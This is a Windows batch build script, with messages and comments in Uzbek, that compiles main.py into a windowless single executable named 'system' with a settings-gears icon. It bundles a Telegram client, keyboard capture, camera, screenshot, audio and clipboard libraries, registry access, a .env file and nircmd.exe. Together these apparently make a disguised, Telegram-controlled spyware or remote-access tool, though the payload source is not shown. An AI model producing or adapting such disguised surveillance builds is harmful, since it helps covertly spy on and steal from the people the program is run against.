@echo off
chcp 65001 >nul
title System.exe Builder
echo.
echo =============================================
echo       SYSTEM.EXE YARATISH BOSHLANDI
echo =============================================
echo.

REM Joriy papkani aniqlash
set "CURRENT_DIR=%~dp0"
cd /d "%CURRENT_DIR%"

REM System papkasini yaratish
if not exist "system" mkdir system
echo [✓] system papkasi yaratildi

REM Eski build fayllarni tozalash
if exist "build" rmdir /s /q "build"
if exist "system.spec" del /f /q "system.spec"
echo [✓] Eski build fayllar tozalandi

echo.
echo [*] PyInstaller ishga tushmoqda...
echo.

REM PyInstaller bilan build qilish - VENV ICHIDAN
.venv\Scripts\pyinstaller --onefile ^
    --noconsole ^
    --name=system ^
    --icon=settings-gears.ico ^
    --distpath=system ^
    --workpath=build ^
    --additional-hooks-dir=. ^
    --collect-all=telethon ^
    --collect-submodules=telethon ^
    --collect-all=cryptography ^
    --collect-all=pynput ^
    --collect-all=PIL ^
    --collect-all=cv2 ^
    --hidden-import=telethon ^
    --hidden-import=telethon.sync ^
    --hidden-import=telethon.tl ^
    --hidden-import=telethon.tl.types ^
    --hidden-import=telethon.tl.functions ^
    --hidden-import=telethon.crypto ^
    --hidden-import=telethon.network ^
    --hidden-import=telethon.sessions ^
    --hidden-import=telethon.extensions ^
    --hidden-import=sounddevice ^
    --hidden-import=scipy ^
    --hidden-import=pyautogui ^
    --hidden-import=psutil ^
    --hidden-import=sqlite3 ^
    --hidden-import=aiohttp ^
    --hidden-import=winreg ^
    --hidden-import=ctypes ^
    --hidden-import=asyncio ^
    --hidden-import=pyperclip ^
    --hidden-import=win32api ^
    --hidden-import=win32con ^
    --hidden-import=win32gui ^
    --add-data ".env;." ^
    --add-binary "nircmd.exe;." ^
    main.py

if %errorlevel% neq 0 (
    echo.
    echo [X] XATO: Build muvaffaqiyatsiz!
    pause
    exit /b 1
)

REM Tozalash
if exist "build" rmdir /s /q "build"
if exist "system.spec" del /f /q "system.spec"

echo.
echo =============================================
echo       [✓] MUVAFFAQIYATLI YARATILDI!
echo =============================================
echo.
echo Joylashuv: %CURRENT_DIR%system\system.exe
echo.
echo =============================================
pause
